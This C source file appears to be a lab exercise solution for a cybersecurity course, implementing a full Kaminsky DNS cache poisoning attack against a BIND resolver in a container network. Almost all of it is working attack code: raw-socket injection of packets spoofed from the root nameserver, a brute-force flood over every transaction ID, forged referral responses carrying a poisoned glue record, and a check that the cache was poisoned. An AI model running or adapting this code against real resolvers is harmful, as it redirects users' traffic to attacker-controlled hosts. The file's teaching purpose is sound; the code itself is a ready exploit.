// ex2_client.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <time.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>

#include <ldns/ldns.h>

/* =======================
 *   CONSTANTS & GLOBALS
 * ======================= */

#define RESOLVER_IP        "192.168.1.203"   /* bind9res */
#define ROOT_NS_IP         "192.168.1.204"   /* effective root */
#define ATTACKER_AUTH_IP   "192.168.1.201"   /* attacker-auth */
#define ATTACKER_CLIENT_IP "192.168.1.202"   /* this container */

/* MAC addresses for all containers */
#define RESOLVER_MAC       "\x02\x42\xac\x11\x00\x03"
#define ROOT_NS_MAC        "\x02\x42\xac\x11\x00\x04"
#define ATTACKER_AUTH_MAC  "\x02\x42\xac\x11\x00\x01"
#define ATTACKER_CLIENT_MAC "\x02\x42\xac\x11\x00\x02"
#define VICTIM_CLIENT_MAC  "\x02\x42\xac\x11\x00\x05"

#define DNS_PORT           53
#define MAX_SUBDOMAIN_LEN  256
#define MAX_BYTES_PER_PACKET 2048
#define TCP_PORT    12345       // Port for receiving resolver port from server
#define MAX_LEN_PORT 64
// send at most 65536*20 spoofed packets in each attack attempt
#define MAX_SPOOFED_PKTS 65536
#define MAX_ROUNDS         20  // Maximum attack rounds to attempt

/* raw socket for packet injection */
static int g_raw_sockfd = -1;
static struct sockaddr_ll g_dest_addr;
static unsigned char g_src_mac[6];
static unsigned char g_dest_mac[6];

/* learned resolver source port */
static uint16_t g_resolver_src_port = 0;

/* =======================
 *   LISTENER HELPER FUNCTIONS
 * ======================= */
static int setup_tcp_listener(void)
{
  int sockfd;
  int opt = 1;
  struct sockaddr_in addr;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    perror("socket (tcp listener)");
    return -1;
  }
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt)) < 0) {
    perror("setsockopt(SO_REUSEADDR)");
    close(sockfd);
    return -1;
  }

  opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, (socklen_t)sizeof(opt)) < 0) {
        perror("setsockopt(SO_REUSEPORT)");
        close(sockfd);
        return -1;
    }


  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  addr.sin_port = htons(TCP_PORT);

  if (bind(sockfd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
    perror("bind (tcp listener)");
    close(sockfd);
    return -1;
  }

  if (listen(sockfd, 1) < 0) {
    perror("listen");
    close(sockfd);
    return -1;
  }

  // TCP listener ready on port TCP_PORT
  return sockfd;
}

static int wait_for_resolver_port_over_tcp(int listen_sock)
{
  struct sockaddr_in peer;
  socklen_t peer_len = (socklen_t)sizeof(peer);
  int conn;
  char buf[MAX_LEN_PORT];
  ssize_t n;

  // Waiting for resolver port from server over TCP

  conn = accept(listen_sock, (struct sockaddr *)&peer, &peer_len);
  if (conn < 0) {
    perror("accept");
    return -1;
  }

  n = recv(conn, buf, (size_t)(sizeof(buf) - 1), 0);
  if (n < 0) {
    perror("recv");
    close(conn);
    return -1;
  }

  buf[n] = '\0';
  // Port received from auth server

  int port = atoi(buf);
  close(conn);

  if (port <= 0 || port > 65535) {
    fprintf(stderr, "Invalid port number received: %d\n", port);
    return -1;
  }

  return port;
}



/* =======================
 *   CHECKSUM FUNCTIONS
 * ======================= */

/**
 * calculate_checksum - Calculate Internet checksum (RFC 1071)
 * @data: Pointer to data buffer
 * @len: Length of data in bytes
 *
 * Returns: 16-bit checksum value
 */
static uint16_t calculate_checksum(const void *data, size_t len)
{
    const uint16_t *buf = (const uint16_t *)data;
    uint32_t sum = 0;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(const uint8_t *)buf;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return (uint16_t)~sum;
}

/**
 * calculate_udp_checksum - Calculate UDP checksum with pseudo-header
 * @src_ip: Source IP address (network byte order)
 * @dest_ip: Destination IP address (network byte order)
 * @udp_hdr: Pointer to UDP header
 * @udp_len: Total UDP length (header + data)
 *
 * Returns: 16-bit UDP checksum
 */
static uint16_t calculate_udp_checksum(uint32_t src_ip, uint32_t dest_ip,
                                       const struct udphdr *udp_hdr, uint16_t udp_len)
{
    struct {
        uint32_t src_addr;
        uint32_t dest_addr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t udp_length;
    } pseudo_header;

    pseudo_header.src_addr = src_ip;
    pseudo_header.dest_addr = dest_ip;
    pseudo_header.zero = 0;
    pseudo_header.protocol = IPPROTO_UDP;
    pseudo_header.udp_length = htons(udp_len);

    uint32_t sum = 0;
    const uint16_t *buf;

    // Add pseudo-header
    buf = (const uint16_t *)&pseudo_header;
    for (size_t i = 0; i < sizeof(pseudo_header) / 2; i++) {
        sum += buf[i];
    }

    // Add UDP header and data
    buf = (const uint16_t *)udp_hdr;
    size_t len = udp_len;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(const uint8_t *)buf;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return (uint16_t)~sum;
}

/* =======================
 *   UTILITY FUNCTIONS
 * ======================= */

/**
 * get_interface_info - Get MAC address and interface index for eth0
 * @ifname: Interface name (e.g., "eth0")
 * @mac: Buffer to store MAC address (6 bytes)
 * @ifindex: Pointer to store interface index
 *
 * Returns: 0 on success, -1 on failure
 */
static int get_interface_info(const char *ifname, unsigned char *mac, int *ifindex)
{
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    if (sockfd < 0) {
        perror("socket for ioctl");
        return -1;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    // Get MAC address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        close(sockfd);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    // Get interface index
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl SIOCGIFINDEX");
        close(sockfd);
        return -1;
    }
    *ifindex = ifr.ifr_ifindex;

    close(sockfd);
    return 0;
}

/* Initialize raw socket for packet injection on eth0 (inside container). */
static int init_raw_socket(void)
{
    int ifindex;

    // Create raw socket
    g_raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (g_raw_sockfd < 0) {
        perror("socket(AF_PACKET)");
        return -1;
    }

    // Get eth0 MAC address and interface index
    if (get_interface_info("eth0", g_src_mac, &ifindex) < 0) {
        fprintf(stderr, "Failed to get eth0 interface info\n");
        close(g_raw_sockfd);
        g_raw_sockfd = -1;
        return -1;
    }

    // Set source MAC to root NS (for spoofing packets from root server)
    memcpy(g_src_mac, ROOT_NS_MAC, 6);

    // Set destination MAC to resolver
    memcpy(g_dest_mac, RESOLVER_MAC, 6);

    // Setup sockaddr_ll for sendto
    memset(&g_dest_addr, 0, sizeof(g_dest_addr));
    g_dest_addr.sll_family = AF_PACKET;
    g_dest_addr.sll_ifindex = ifindex;
    g_dest_addr.sll_halen = ETH_ALEN;
    memcpy(g_dest_addr.sll_addr, g_dest_mac, 6);

    // Raw socket initialized on eth0
    return 0;
}

/* Close raw socket if open. */
static void cleanup_raw_socket(void)
{
    if (g_raw_sockfd >= 0) {
        close(g_raw_sockfd);
        g_raw_sockfd = -1;
    }
}

/**
 * build_unique_subdomain - Generate unique subdomain for each attack round
 * @round: Round number to incorporate into subdomain
 * @buf: Output buffer for the subdomain string
 * @buf_len: Size of output buffer
 *
 * Creates subdomains like: www.example0.cybercourse.example.com,
 * www.example1.cybercourse.example.com, etc.
 *
 * Each round needs a unique subdomain to avoid cache hits from previous
 * rounds, giving us a fresh attack window.
 */
static void build_unique_subdomain(int round, char *buf, size_t buf_len)
{
    snprintf(buf, buf_len, "ww%d.example1.cybercourse.example.com", round);
}

/**
 * send_dns_query_to_resolver - Send DNS query to recursive resolver
 * @qname: Fully qualified domain name to query
 *
 * Sends a UDP DNS query to the resolver which will trigger it to query
 * upstream authoritative servers.
 *
 * Returns: 0 on success, -1 on failure
 */
static int send_dns_query_to_resolver(const char *qname)
{
    int sockfd;
    struct sockaddr_in resolver_addr;
    ldns_pkt *query = NULL;
    uint8_t *wire_data = NULL;
    size_t wire_len = 0;
    ldns_status status;
    int ret = -1;

    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket (UDP)");
        return -1;
    }

    // Build DNS query
    query = ldns_pkt_query_new(
        ldns_dname_new_frm_str(qname),
        LDNS_RR_TYPE_A,
        LDNS_RR_CLASS_IN,
        LDNS_RD  // Recursion desired
    );

    if (!query) {
        fprintf(stderr, "Failed to create DNS query for %s\n", qname);
        close(sockfd);
        return -1;
    }

    // Serialize to wire format
    status = ldns_pkt2wire(&wire_data, query, &wire_len);
    if (status != LDNS_STATUS_OK) {
        fprintf(stderr, "Failed to serialize query: %s\n",
                ldns_get_errorstr_by_id(status));
        ldns_pkt_free(query);
        close(sockfd);
        return -1;
    }

    // Setup resolver address
    memset(&resolver_addr, 0, sizeof(resolver_addr));
    resolver_addr.sin_family = AF_INET;
    resolver_addr.sin_port = htons(DNS_PORT);
    if (inet_pton(AF_INET, RESOLVER_IP, &resolver_addr.sin_addr) != 1) {
        perror("inet_pton");
        goto cleanup;
    }

    // Send query to resolver
    ssize_t sent = sendto(sockfd, wire_data, wire_len, 0,
                          (struct sockaddr *)&resolver_addr,
                          sizeof(resolver_addr));

    if (sent < 0) {
        perror("sendto (resolver)");
        goto cleanup;
    }

    // DNS query sent to resolver
    ret = 0;

cleanup:
    if (wire_data) free(wire_data);
    if (query) ldns_pkt_free(query);
    close(sockfd);
    return ret;
}

/**
 * learn_resolver_source_port - Discover the source port used by resolver
 *
 * Sends a DNS query to the resolver for www.attacker.cybercourse.example.com.
 * The resolver will forward the query to our attacker's authoritative server,
 * which captures the source port and sends it back to us over TCP.
 *
 * This is critical for the Kaminsky attack as we need to spoof responses
 * with the correct destination port.
 *
 * Returns: 0 on success, -1 on failure
 */
static int learn_resolver_source_port(void)
{
    const char *trigger_domain = "www.attacker.cybercourse.example.com";
    int listen_sock;
    int port;

    printf("Learning resolver source port...\n");

    // Setup TCP listener to receive port from our auth server
    listen_sock = setup_tcp_listener();
    if (listen_sock < 0) {
        fprintf(stderr, "Failed to setup TCP listener\n");
        return -1;
    }

    // Send DNS query to resolver for our attacker domain
    if (send_dns_query_to_resolver(trigger_domain) < 0) {
        fprintf(stderr, "Failed to send DNS query\n");
        close(listen_sock);
        return -1;
    }

    // Wait for our auth server to send us the port over TCP
    port = wait_for_resolver_port_over_tcp(listen_sock);
    close(listen_sock);

    if (port < 0 || port > 65535) {
        fprintf(stderr, "Invalid port received: %d\n", port);
        return -1;
    }

    g_resolver_src_port = (uint16_t)port;
    printf("✓ Resolver source port: %u\n\n", g_resolver_src_port);

    return 0;
}

/**
 * build_spoofed_response - Create malicious DNS response for Kaminsky attack
 * @qname: Query name being spoofed (e.g., ww0.example1.cybercourse.example.com)
 * @txid_guess: Guessed transaction ID to match resolver's query
 * @out_buf: Output buffer for serialized DNS packet (caller must free)
 * @out_len: Output length of serialized packet
 *
 * Builds a referral DNS response (Kaminsky payload) that includes:
 * - Answer section: EMPTY (referral response)
 * - Authority section: NS record claiming www.example1.cybercourse.example.com is the NS
 * - Additional section: Glue A record mapping www.example1... to 6.6.6.6 (THE POISON!)
 *
 * This matches the classic Kaminsky attack where the target domain becomes its own
 * nameserver with a poisoned glue record.
 *
 * Returns: 0 on success, -1 on failure
 */
static int build_spoofed_response(const char *qname,
                                  uint16_t txid_guess,
                                  uint8_t **out_buf,
                                  size_t *out_len)
{
    ldns_pkt *response = NULL;
    ldns_rr *authority_rr = NULL;
    ldns_rr *additional_rr = NULL;
    ldns_status status;
    int ret = -1;

    // Building spoofed response

    // Create new DNS packet
    response = ldns_pkt_new();
    if (!response) {
        fprintf(stderr, "Failed to create DNS packet\n");
        return -1;
    }

    // Set DNS header fields
    ldns_pkt_set_id(response, txid_guess);
    ldns_pkt_set_qr(response, 1);              // QR=1 (response)
    ldns_pkt_set_aa(response, 1);              // AA=1 (authoritative)
    ldns_pkt_set_rd(response, 1);              // RD=1 (recursion desired, copied from query)
    ldns_pkt_set_ra(response, 1);              // RA=1 (recursion available)
    ldns_pkt_set_opcode(response, LDNS_PACKET_QUERY);
    ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);

    // Add question section (copy from original query)
    ldns_rdf *qname_rdf = ldns_dname_new_frm_str(qname);
    if (!qname_rdf) {
        fprintf(stderr, "Failed to create domain name\n");
        goto cleanup;
    }

    ldns_rr *question = ldns_rr_new();
    ldns_rr_set_owner(question, qname_rdf);
    ldns_rr_set_type(question, LDNS_RR_TYPE_A);
    ldns_rr_set_class(question, LDNS_RR_CLASS_IN);
    ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question);
    ldns_pkt_set_qdcount(response, 1);

    // Answer section: Directly answer the query with poisoned IP
    // This caches the A record for the queried subdomain (e.g., ww0.example1...)
    ldns_rr *answer_rr = ldns_rr_new();
    ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(qname));
    ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
    ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(answer_rr, 86400);
    ldns_rr_push_rdf(answer_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4"));
    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer_rr);

    // Authority section: Claim example1.cybercourse.example.com delegates to www.example1...
    // This matches the course example pattern (zone NS target)
    authority_rr = ldns_rr_new();
    ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("example1.cybercourse.example.com"));
    ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
    ldns_rr_set_class(authority_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(authority_rr, 86400);
    ldns_rr_push_rdf(authority_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
    ldns_pkt_push_rr(response, LDNS_SECTION_AUTHORITY, authority_rr);

    // Additional section: Glue record for the NS (THE POISON!)
    // This makes www.example1.cybercourse.example.com resolve to 6.6.6.6
    additional_rr = ldns_rr_new();
    ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
    ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
    ldns_rr_set_class(additional_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(additional_rr, 86400);
    ldns_rr_push_rdf(additional_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "6.6.6.6"));
    ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, additional_rr);

    // Serialize to wire format
    status = ldns_pkt2wire(out_buf, response, out_len);
    if (status != LDNS_STATUS_OK) {
        fprintf(stderr, "Failed to serialize DNS packet: %s\n",
                ldns_get_errorstr_by_id(status));
        goto cleanup;
    }

    // Spoofed response serialized
    ret = 0;

cleanup:
    if (response) {
        ldns_pkt_free(response);
    }
    return ret;
}

/* Inject one spoofed packet into the network via raw socket. */
static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
{
    unsigned char packet[MAX_BYTES_PER_PACKET];
    struct ether_header *eth;
    struct iphdr *ip;
    struct udphdr *udp;
    uint8_t *dns_payload;
    size_t total_len;

    uint32_t src_ip, dest_ip;

    // Convert IPs to network byte order
    inet_pton(AF_INET, ROOT_NS_IP, &src_ip);
    inet_pton(AF_INET, RESOLVER_IP, &dest_ip);

    // Calculate sizes
    size_t eth_len = sizeof(struct ether_header);
    size_t ip_len = sizeof(struct iphdr);
    size_t udp_len = sizeof(struct udphdr);
    total_len = eth_len + ip_len + udp_len + dns_len;

    if (total_len > MAX_BYTES_PER_PACKET) {
        fprintf(stderr, "Packet too large: %zu bytes\n", total_len);
        return -1;
    }

    memset(packet, 0, total_len);

    // === Build Ethernet Header ===
    eth = (struct ether_header *)packet;
    memcpy(eth->ether_dhost, g_dest_mac, 6);
    memcpy(eth->ether_shost, g_src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    // === Build IP Header ===
    ip = (struct iphdr *)(packet + eth_len);
    ip->version = 4;
    ip->ihl = 5;  // 5 * 4 = 20 bytes (no options)
    ip->tos = 0;
    ip->tot_len = htons(ip_len + udp_len + dns_len);
    ip->id = htons(rand() % 65536);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = src_ip;
    ip->daddr = dest_ip;
    ip->check = 0;  // Will calculate below
    ip->check = calculate_checksum(ip, ip_len);

    // === Build UDP Header ===
    udp = (struct udphdr *)(packet + eth_len + ip_len);
    udp->source = htons(DNS_PORT);
    udp->dest = htons(g_resolver_src_port);
    udp->len = htons(udp_len + dns_len);
    udp->check = 0;  // Will calculate below

    // === Copy DNS payload ===
    dns_payload = packet + eth_len + ip_len + udp_len;
    memcpy(dns_payload, dns_data, dns_len);

    // === Calculate UDP checksum ===
    udp->check = calculate_udp_checksum(src_ip, dest_ip, udp, udp_len + dns_len);

    // === Send packet ===
    ssize_t sent = sendto(g_raw_sockfd, packet, total_len, 0,
                          (struct sockaddr *)&g_dest_addr, sizeof(g_dest_addr));

    if (sent < 0) {
        perror("sendto");
        return -1;
    }

    return 0;
}

/* For a single "attack window" (one round):
 * 1. Send a query for a unique subdomain.
 * 2. While query "in flight", send many spoofed responses with guessed TXIDs.
 */
static void perform_attack_round(int round)
{
    char subdomain[MAX_SUBDOMAIN_LEN];

    build_unique_subdomain(round, subdomain, sizeof(subdomain));

    /* Step 1: send query to resolver */
    printf("[Round %d] Testing %s...\n", round, subdomain);
    (void)send_dns_query_to_resolver(subdomain);

    /* Step 2: flood with spoofed answers trying different TXIDs */

    uint8_t *spoofed_dns = NULL;
    size_t spoofed_len = 0;
    int successful_injections = 0;

    for (uint32_t i = 0; i < MAX_SPOOFED_PKTS; i++) {
        // Try different TXID values across the 16-bit space
        // We cycle through all possible values multiple times
        uint16_t txid_guess = (uint16_t)(i & 0xFFFF);

        // Build spoofed DNS response with guessed TXID
        if (build_spoofed_response(subdomain, txid_guess,
                                   &spoofed_dns, &spoofed_len) < 0) {
            continue; // Skip this TXID on error
        }

        // Inject the spoofed packet via raw socket
        if (inject_spoofed_packet(spoofed_dns, spoofed_len) == 0) {
            successful_injections++;
        }

        // Free the allocated DNS buffer
        if (spoofed_dns) {
            free(spoofed_dns);
            spoofed_dns = NULL;
        }

        // Progress tracking (silent)
    }

    printf("  → Sent %d packets\n", successful_injections);
}

/**
 * check_poisoning - Verify if DNS cache poisoning succeeded
 *
 * Queries the resolver for www.example1.cybercourse.example.com and checks
 * if the A record points to 6.6.6.6 (our poisoned glue record).
 * This indicates the cache has been successfully poisoned.
 *
 * Returns: 1 if poisoning succeeded, 0 otherwise
 */
static int check_poisoning(void)
{
    const char *test_domain = "www.example1.cybercourse.example.com";
    const char *poison_ip = "6.6.6.6";
    int sockfd;
    struct sockaddr_in resolver_addr;
    ldns_pkt *query = NULL;
    ldns_pkt *response = NULL;
    uint8_t *wire_query = NULL;
    uint8_t wire_response[512];
    size_t wire_query_len = 0;
    ldns_status status;
    int poisoned = 0;

    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket (check)");
        return 0;
    }

    // Set receive timeout
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // Build DNS query
    query = ldns_pkt_query_new(
        ldns_dname_new_frm_str(test_domain),
        LDNS_RR_TYPE_A,
        LDNS_RR_CLASS_IN,
        LDNS_RD
    );

    if (!query) {
        close(sockfd);
        return 0;
    }

    // Serialize query
    status = ldns_pkt2wire(&wire_query, query, &wire_query_len);
    if (status != LDNS_STATUS_OK) {
        ldns_pkt_free(query);
        close(sockfd);
        return 0;
    }

    // Setup resolver address
    memset(&resolver_addr, 0, sizeof(resolver_addr));
    resolver_addr.sin_family = AF_INET;
    resolver_addr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, RESOLVER_IP, &resolver_addr.sin_addr);

    // Send query
    ssize_t sent = sendto(sockfd, wire_query, wire_query_len, 0,
                          (struct sockaddr *)&resolver_addr,
                          sizeof(resolver_addr));

    if (sent < 0) {
        perror("sendto (check)");
        goto cleanup;
    }

    // Receive response
    ssize_t recv_len = recvfrom(sockfd, wire_response, sizeof(wire_response),
                                0, NULL, NULL);

    if (recv_len < 0) {
        // Timeout or error - poisoning might have failed
        goto cleanup;
    }

    // Parse response
    status = ldns_wire2pkt(&response, wire_response, (size_t)recv_len);
    if (status != LDNS_STATUS_OK) {
        goto cleanup;
    }

    // Check response details
    printf("  [Check] Response RCODE: %d, Answers: %zu\n",
           ldns_pkt_get_rcode(response),
           ldns_pkt_ancount(response));

    // Check answer section for A record pointing to 6.6.6.6
    ldns_rr_list *answer = ldns_pkt_answer(response);
    if (answer) {
        for (size_t i = 0; i < ldns_rr_list_rr_count(answer); i++) {
            ldns_rr *rr = ldns_rr_list_rr(answer, i);
            if (ldns_rr_get_type(rr) == LDNS_RR_TYPE_A) {
                ldns_rdf *a_rdf = ldns_rr_rdf(rr, 0);
                if (a_rdf) {
                    char *ip_str = ldns_rdf2str(a_rdf);
                    if (ip_str) {
                        printf("  [Check] Got A record: %s\n", ip_str);
                        // Compare IP (strip trailing dot/whitespace if present)
                        if (strncmp(ip_str, poison_ip, strlen(poison_ip)) == 0) {
                            printf("\n✓ CACHE POISONED! %s → %s\n",
                                   test_domain, ip_str);
                            poisoned = 1;
                            free(ip_str);
                            break;
                        }
                        free(ip_str);
                    }
                }
            }
        }
    }

    if (!poisoned) {
        printf("  [Check] Cache not poisoned yet\n");
    }

cleanup:
    if (wire_query) free(wire_query);
    if (query) ldns_pkt_free(query);
    if (response) ldns_pkt_free(response);
    close(sockfd);

    return poisoned;
}

/* =======================
 *          MAIN
 * ======================= */

int main(void)
{
    int ret = 1; /* default: failure */

    /* Seed RNG - random subdomains or txid sequences. */
    (void)srand((unsigned int)time(NULL));

    printf("=== Kaminsky DNS Cache Poisoning Attack ===\n\n");
    if (init_raw_socket() != 0) {
        return EXIT_FAILURE;
    }

    // Learning resolver source port
    if (learn_resolver_source_port() != 0) {
        goto cleanup;
    }

    printf("Starting attack rounds...\n");
    /* Main Kaminsky-style loop: multiple attack windows with different subdomains. */
    for (int round = 0; round < MAX_ROUNDS; ++round) {
        perform_attack_round(round);

        if (check_poisoning() != 0) {
            /* success */
            printf("\n✓ Attack successful! DNS cache poisoned.\n");
            ret = 0;
            break;
        }
    }

    if (ret != 0) {
        printf("\n✗ Attack failed after %d rounds.\n", MAX_ROUNDS);
    }

cleanup:
    cleanup_raw_socket();
    return ret;
}